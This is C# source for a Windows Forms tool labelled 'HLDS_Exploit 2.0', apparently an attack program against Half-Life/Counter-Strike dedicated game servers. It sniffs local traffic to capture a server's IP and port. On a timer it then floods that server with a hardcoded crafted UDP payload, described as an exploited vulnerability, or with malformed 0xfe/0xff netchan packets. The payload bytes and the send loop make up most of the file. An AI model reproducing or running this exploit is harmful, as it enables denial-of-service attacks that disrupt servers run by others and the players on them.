using SimpleSniffer.BaseClass;
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Net;
using System.Windows.Forms;

namespace SimpleSniffer
{
    // csgo
    //string[] stringArray = { "93." }; // getchallenge steam ??
    //socket.Send(new byte[] { 0xff, 0xff, 0xff, 0xff, 0x6b, 0x89, 0x35, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x70, 0x4b, 0xfb, 0x08, 0x00, 0x00, 0x01, 0x10, 0xc6, 0x01, 0x0a, 0xc3, 0x01, 0x0a, 0x0d, 0x12, 0x09, 0x33, 0x39, 0x32, 0x37, 0x37, 0x31, 0x35, 0x38, 0x32, 0x18, 0x01, 0x0a, 0x05, 0x12, 0x01, 0x31, 0x18, 0x03, 0x0a, 0x05, 0x12, 0x01, 0x30, 0x18, 0x04, 0x0a, 0x05, 0x12, 0x01, 0x30, 0x18, 0x05, 0x0a, 0x0f, 0x12, 0x0b, 0x53, 0x6b, 0x69, 0x6c, 0x6c, 0x61, 0x72, 0x74, 0x7a, 0x48, 0x44, 0x18, 0x06, 0x0a, 0x05, 0x12, 0x01, 0x32, 0x18, 0x07, 0x0a, 0x05, 0x12, 0x01, 0x31, 0x18, 0x08, 0x0a, 0x06, 0x12, 0x02, 0x36, 0x34, 0x18, 0x09, 0x0a, 0x15, 0x12, 0x11, 0x24, 0x66, 0x38, 0x35, 0x65, 0x39, 0x38, 0x39, 0x62, 0x65, 0x31, 0x35, 0x31, 0x39, 0x34, 0x33, 0x31, 0x18, 0x0a, 0x0a, 0x05, 0x12, 0x01, 0x30, 0x18, 0x1d, 0x0a, 0x05, 0x12, 0x01, 0x30, 0x18, 0x0b, 0x0a, 0x05, 0x12, 0x01, 0x31, 0x18, 0x0c, 0x0a, 0x05, 0x12, 0x01, 0x30, 0x18, 0x0d, 0x0a, 0x06, 0x12, 0x02, 0x36, 0x34, 0x18, 0x0e, 0x0a, 0x08, 0x12, 0x04, 0x31, 0x32, 0x30, 0x30, 0x18, 0x0f, 0x0a, 0x0a, 0x12, 0x06, 0x31, 0x39, 0x36, 0x36, 0x30, 0x38, 0x18, 0x10, 0x0a, 0x05, 0x12, 0x01, 0x31, 0x18, 0x11, 0x0a, 0x05, 0x12, 0x01, 0x31, 0x18, 0x12, 0x0a, 0x09, 0x12, 0x05, 0x30, 0x2e, 0x30, 0x33, 0x31, 0x18, 0x13, 0x0a, 0x05, 0x12, 0x01, 0x31, 0x18, 0x14, 0x0a, 0x05, 0x12, 0x01, 0x34, 0x18, 0x15, 0x62, 0x28, 0xa3, 0xc2, 0x37, 0x31, 0xbd, 0xf0, 0x03, 0x00, 0x00, 0x00, 0x00, 0xe4, 0x01, 0xfc, 0x6f, 0xd2, 0x2e, 0x02, 0x00, 0x20, 0x02, 0x28, 0x00, 0x00, 0x00, 0x82, 0x4a, 0xe4, 0x12, 0x0e, 0xf2, 0x76, 0x5f, 0xfc, 0x6f, 0xd2, 0x2e, 0x02, 0x00, 0x20, 0x02, 0x96, 0xc2, 0x61, 0xba, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x70, 0xc7, 0xfe, 0xfc, 0x01, 0x00, 0x00, 0x00, 0x00, 0x1a, 0x23, 0x03, 0x4c, 0x00, 0x00, 0x00, 0x64, 0x01, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xfc, 0x6f, 0xd2, 0x2e, 0x02, 0x00, 0x20, 0x02, 0xb4, 0x05, 0x00, 0x00, 0xf4, 0xe8, 0xf2, 0x7c, 0x3e, 0x00, 0x50, 0x81, 0x01, 0x00, 0x00, 0x00, 0xc4, 0x10, 0x56, 0xba, 0xc4, 0x6f, 0x8d, 0xba, 0x02, 0x00, 0x34, 0x42, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8c, 0xac, 0x22, 0xa4, 0x8e, 0x43, 0xff, 0xc7, 0xcc, 0xe3, 0x4e, 0xf2, 0x9b, 0xa2, 0x4a, 0x34, 0xa4, 0xb9, 0x44, 0xb6, 0x13, 0x88, 0xb7, 0x12, 0x20, 0xcd, 0xee, 0x8a, 0xbf, 0xf5, 0x28, 0x7b, 0x41, 0xe1, 0xf7, 0x6e, 0xfb, 0xb8, 0xe3, 0xfe, 0x72, 0xc6, 0x2e, 0xa6, 0x19, 0x07, 0x72, 0xb5, 0x1f, 0x08, 0x4c, 0x81, 0xc0, 0x6a, 0x79, 0x45, 0x58, 0x29, 0x06, 0x34, 0xba, 0x27, 0x87, 0xad, 0x38, 0xf7, 0xb7, 0xb5, 0x8d, 0x75, 0x83, 0x25, 0x3d, 0x95, 0xc4, 0x4e, 0xfb, 0x7c, 0x03, 0x4e, 0x4f, 0x78, 0x68, 0xb1, 0x69, 0x21, 0xdb, 0x25, 0x48, 0xa7, 0xbb, 0x5c, 0x85, 0x0c, 0xdc, 0xe5, 0x99, 0x56, 0xf1, 0x23, 0x75, 0xb6, 0xb9, 0x03, 0x28, 0x56, 0xcd, 0x3c, 0x5d, 0xc8, 0xe1, 0xe0, 0x2a, 0x9a, 0xad, 0x5d, 0xce, 0xe2, 0x7a, 0xef, 0x1d, 0x29, 0xfc, 0x38, 0x0a, 0x25, 0xdf, 0xe3, 0x20 });
    //}
public partial class FormCSNZExplota : Form
    {
        List<Monitor> monitorList = new List<Monitor>();
        List<Packet> pList = new List<Packet>();
        List<Packet> allList = new List<Packet>();
        delegate void refresh(Packet p);
        long totalLength = 0;
        long totalCount = 0;
        int pula = 0;
        int pula2 = 1;

        public FormCSNZExplota()
        {
            InitializeComponent();
        }
        private void deactivateSearch()
        {
            filterCheckBox.Enabled = false;
            startButton.Enabled = false;
        }
        private void activateSearch()
        {
            filterCheckBox.Enabled = true;
            startButton.Enabled = true;
        }

        private void startRaking()
        {
            monitorList.Clear();
            IPAddress[] hosts = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
            if (hosts == null || hosts.Length == 0)
            {
                MessageBox.Show("Network error !");
            }
            for (int i = 0; i < hosts.Length; i++)
            {
                Monitor monitor = new Monitor(hosts[i]);
                monitor.newPacketEventHandler += new Monitor.NewPacketEventHandler(onNewPacket);
                monitorList.Add(monitor);
            }
            foreach (Monitor monitor in monitorList)
            {
                monitor.start();
            }
        }

        private void onNewPacket(Monitor monitor, Packet p)
        {

            this.Invoke(new refresh(onRefresh), p);
        }

        private void onRefresh(Packet p)
        {
            if (this.filterCheckBox.Checked)
            {
            }
            else
            {
                addAndUpdatePackets(p);
            }
            this.hintLabel.Text = string.Format("Packets filtred : {0}", totalCount);
        }

        private void addAndUpdatePackets(Packet p)
        {
            totalCount++;
            totalLength += p.TotalLength;
            allList.Add(p);
            pList.Add(p);
            string stringToCheck = p.getCharString();
            stringToCheck.Replace(".", null);
            string[] stringArray = { "connect " }; // getchallenge steam ??
            foreach (string x in stringArray)
            {
                if (stringToCheck.Contains(x))
                {
                    listaip.Text = p.Des_IP + ":" + p.Des_PORT;
                    BufferTextBoxConnected.Text = stringToCheck;
                    svfound.Visible = true;
                    timer3.Start();
                    svfound.Text = "Server automatically found successfully : " + p.Des_IP + ":" + p.Des_PORT ;
                    this.listView.Items.Add(new ListViewItem(new string[] {p.Time, p.Des_IP,
                        p.Des_PORT, stringToCheck}));
                    this.listView.EnsureVisible(listView.Items.Count > 5 ? listView.Items.Count - 10 : listView.Items.Count);
                }
            }
        }
        private void stopReceiving()
        {
            foreach (Monitor monitor in monitorList)
            {
                monitor.stop();
            }
        }
        private void clearDetail()
        {
            this.BufferTextBoxConnected.Text = "";
        }
        private void startButton_Click(object sender, EventArgs e)
        {
            clearDetail();
            deactivateSearch();
            startRaking();
        }
        private void stopButton_Click(object sender, EventArgs e)
        {
            clearDetail();
            activateSearch();
            stopReceiving();
        }
        private void clearButton_Click(object sender, EventArgs e)
        {
            this.listView.Items.Clear();
            pList.Clear();
            clearDetail();
        }
        private void listView_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListView listView = sender as ListView;
            if (listView.SelectedItems != null && listView.SelectedItems.Count != 0)
            {
                Packet p = pList[listView.SelectedItems[0].Index];
                this.BufferTextBoxConnected.Text = p.getCharString();
            }
        }
        public void CreateKickass2()
        {
            string IP = listaip.Text;
            int timer;

            if (!string.IsNullOrEmpty(IP))
            {
                string[] array = IP.Split(new char[] { ':' });
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(array[0]), Convert.ToInt32(array[1]));
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                socket.Connect(remoteEP);
                if (int.TryParse(timerdelay.Text, out timer))
                {
                    if (timer > 0)
                    {
                        timer1.Interval = timer;
                    }
                }

                for (int ixa = 1; ixa <= Convert.ToInt32(looptime.Text); ixa++)
                {
                    if (vullnerabilityfound.SelectedIndex == 1)
                    {
                        socket.Send(new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0x6B, 0x89, 0x35, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x70, 0x4B, 0xFB, 0x08, 0x00, 0x00, 0x01, 0x10, 0xC6, 0x01, 0x0A, 0xC3, 0x01, 0x0A, 0x0D, 0x12, 0x09, 0x33, 0x39, 0x32, 0x37, 0x37, 0x31, 0x35, 0x38, 0x32, 0x18, 0x01, 0x0A, 0x05, 0x12, 0x01, 0x31, 0x18, 0x03, 0x0A, 0x05, 0x12, 0x01, 0x30, 0x18, 0x04, 0x0A, 0x05, 0x12, 0x01, 0x30, 0x18, 0x05, 0x0A, 0x0F, 0x12, 0x0B, 0x53, 0x6B, 0x69, 0x6C, 0x6C, 0x61, 0x72, 0x74, 0x7A, 0x48, 0x44, 0x18, 0x06, 0x0A, 0x05, 0x12, 0x01, 0x32, 0x18, 0x07, 0x0A, 0x05, 0x12, 0x01, 0x31, 0x18, 0x08, 0x0A, 0x06, 0x12, 0x02, 0x36, 0x34, 0x18, 0x09, 0x0A, 0x15, 0x12, 0x11, 0x24, 0x66, 0x38, 0x35, 0x65, 0x39, 0x38, 0x39, 0x62, 0x65, 0x31, 0x35, 0x31, 0x39, 0x34, 0x33, 0x31, 0x18, 0x0A, 0x0A, 0x05, 0x12, 0x01, 0x30, 0x18, 0x1D, 0x0A, 0x05, 0x12, 0x01, 0x30, 0x18, 0x0B, 0x0A, 0x05, 0x12, 0x01, 0x31, 0x18, 0x0C, 0x0A, 0x05, 0x12, 0x01, 0x30, 0x18, 0x0D, 0x0A, 0x06, 0x12, 0x02, 0x36, 0x34, 0x18, 0x0E, 0x0A, 0x08, 0x12, 0x04, 0x31, 0x32, 0x30, 0x30, 0x18, 0x0F, 0x0A, 0x0A, 0x12, 0x06, 0x31, 0x39, 0x36, 0x36, 0x30, 0x38, 0x18, 0x10, 0x0A, 0x05, 0x12, 0x01, 0x31, 0x18, 0x11, 0x0A, 0x05, 0x12, 0x01, 0x31, 0x18, 0x12, 0x0A, 0x09, 0x12, 0x05, 0x30, 0x2E, 0x30, 0x33, 0x31, 0x18, 0x13, 0x0A, 0x05, 0x12, 0x01, 0x31, 0x18, 0x14, 0x0A, 0x05, 0x12, 0x01, 0x34, 0x18, 0x15, 0x62, 0x28, 0xA3, 0xC2, 0x37, 0x31, 0xBD, 0xF0, 0x03, 0x00, 0x00, 0x00, 0x00, 0xE4, 0x01, 0xFC, 0x6F, 0xD2, 0x2E, 0x02, 0x00, 0x20, 0x02, 0x28, 0x00, 0x00, 0x00, 0x3C, 0xD8, 0x8C, 0x7E, 0xA4, 0x68, 0xA0, 0x8B, 0xFD, 0x6F, 0xD2, 0x2E, 0x02, 0x00, 0x20, 0x02, 0xF0, 0xDC, 0x61, 0xBA, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x70, 0xC7, 0xFE, 0xFC, 0x01, 0x00, 0x00, 0x00, 0x2C, 0x50, 0xD5, 0x04, 0x90, 0x00, 0x00, 0x00, 0x64, 0x01, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xFC, 0x6F, 0xD2, 0x2E, 0x02, 0x00, 0x20, 0x02, 0xB4, 0x05, 0x00, 0x00, 0xF4, 0xE8, 0xF2, 0x7C, 0x3E, 0x00, 0x50, 0x81, 0x01, 0x00, 0x00, 0x00, 0xC4, 0x10, 0x56, 0xBA, 0xC4, 0x6F, 0x8D, 0xBA, 0x02, 0x00, 0x34, 0x42, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8C, 0xAC, 0x22, 0xA4, 0x8E, 0x43, 0xFF, 0xC7, 0xCC, 0xE3, 0x4E, 0xF2, 0x9B, 0xA2, 0x4A, 0x34, 0xA4, 0xB9, 0x44, 0xB6, 0x13, 0x88, 0xB7, 0x12, 0x20, 0xCD, 0xEE, 0x8A, 0xBF, 0xF5, 0x28, 0x7B, 0x41, 0xE1, 0xF7, 0x6E, 0xFB, 0xB8, 0xE3, 0xFE, 0x72, 0xC6, 0x2E, 0xA6, 0x19, 0x07, 0x72, 0xB5, 0x1F, 0x08, 0x4C, 0x81, 0xC0, 0x6A, 0x79, 0x45, 0x58, 0x29, 0x06, 0x34, 0xBA, 0x27, 0x87, 0xAD, 0x38, 0xF7, 0xB7, 0xB5, 0x8D, 0x75, 0x83, 0x25, 0x3D, 0x95, 0xC4, 0x4E, 0xFB, 0x7C, 0x03, 0x4E, 0x4F, 0x78, 0x68, 0xB1, 0x69, 0x21, 0xDB, 0x25, 0x48, 0xA7, 0xBB, 0x5C, 0x85, 0x0C, 0xDC, 0xE5, 0x99, 0x56, 0xF1, 0x23, 0x75, 0xB6, 0xB9, 0x03, 0x28, 0x56, 0xCD, 0x3C, 0x5D, 0xC8, 0xE1, 0xE0, 0x2A, 0x9A, 0xAD, 0x5D, 0xCE, 0xE2, 0x7A, 0xEF, 0x1D, 0x29, 0xFC, 0x38, 0x0A, 0x25, 0xDF, 0xE3, 0x00 });
                    }
                    else
                    {

                        if (comboBox1.SelectedIndex == 0)
                        {
                            socket.Send(new byte[] { 0xfe });
                        }
                        if (comboBox1.SelectedIndex == 1)
                        {
                            socket.Send(new byte[] { 0xfe, 0xff });
                        }
                        if (comboBox1.SelectedIndex == 2)
                        {
                            socket.Send(new byte[] { 0xfe, 0xff, 0xff });
                        }
                        if (comboBox1.SelectedIndex == 3)
                        {
                            socket.Send(new byte[] { 0xfe, 0xff, 0xff, 0xff });
                        }
                        if (comboBox1.SelectedIndex == 4)
                        {
                            socket.Send(new byte[] { 0xfe, 0xff, 0xff, 0xff, 0xff });
                        }
                        if (comboBox1.SelectedIndex == 5)
                        {
                            socket.Send(new byte[] { 0xfe, 0xff, 0xff, 0xff, 0xff, 0xff });
                        }
                        if (comboBox1.SelectedIndex == 6)
                        {
                            socket.Send(new byte[] { 0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff });
                        }
                        if (comboBox1.SelectedIndex == 7)
                        {
                            socket.Send(new byte[] { 0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff });
                        }
                        if (comboBox1.SelectedIndex == 8)
                        {
                            socket.Send(new byte[] { 0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff });
                        }
                    }
                }
            }
        }
        private void MainForm_Load(object sender, EventArgs e)
        {
            clearDetail();
            deactivateSearch();
            startRaking();
            vullnerabilityfound.SelectedIndex = 0; // vulnerablitate
            comboBox1.SelectedIndex = 0; // netchan 1
            FormCSNZExplota.ActiveForm.Width = 392;
            FormCSNZExplota.ActiveForm.Height = 213;
        }
        private void Button4_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show("\nPlease connect to server to get IP:Port\n\nBuild software  : SkillartzHD\nVullnerability found by : SkillartzHD & Spawner\n\nSkillartzHD - Romanian (Steam: SkillartzHD_hlds) \nSpawner11 - Morocco (Steam: freezo-spawner)\n\nRealised data : 16/07/2019\n", "function of HLDS_Exploit 2.0", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            timer1.Stop();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            timer1.Start();
        }
        private void timerdelay_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
            }
            if ((e.KeyChar == '.') && ((sender as TextBox).Text.IndexOf('.') > -1))
            {
                e.Handled = true;
            }
        }

        private void listaip_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar) && (e.KeyChar != '.') && (e.KeyChar != ':'))
            {
                e.Handled = true;
            }
            if ((e.KeyChar == '.') && ((e.KeyChar == ':') && ((sender as TextBox).Text.IndexOf('.') > -1)))
            {
                e.Handled = true;
            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            CreateKickass2();
        }

        private void Timer2_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            if (pula2 == 1)
            {
                groupBox2.Width = 356;
                listView.Width = 335;
            }
            else
            {
                groupBox2.Width = 727;
                listView.Width = 476;
            }
            if (pula == 1)
            {
                button3.Text = "Console ->";
                FormCSNZExplota.ActiveForm.Height = 209;
                pula = 0;
            }
            else if (pula==0)
            {
                button3.Text = "Console <-";
                FormCSNZExplota.ActiveForm.Height = 507;
                pula = 1;
            }
          //  761, 507
        }

        private void Timer3_Tick(object sender, EventArgs e)
        {
            svfound.Visible = false;
            timer3.Stop();
        }

        private void Button5_Click(object sender, EventArgs e)
        {
            if (pula2 == 1)
            {
                button5.Text = "<-";
                FormCSNZExplota.ActiveForm.Width = 759;
                pula2 = 0;
            }
            else if (pula2 == 0)
            {
                button5.Text = "->";
                FormCSNZExplota.ActiveForm.Width = 392;
                pula2 = 1;
            }
            if (pula2 == 1)
            {
                groupBox2.Width = 356;
                listView.Width = 335;
            }
            else
            {
                groupBox2.Width = 727;
                listView.Width = 476;
            }
        }
    }
}
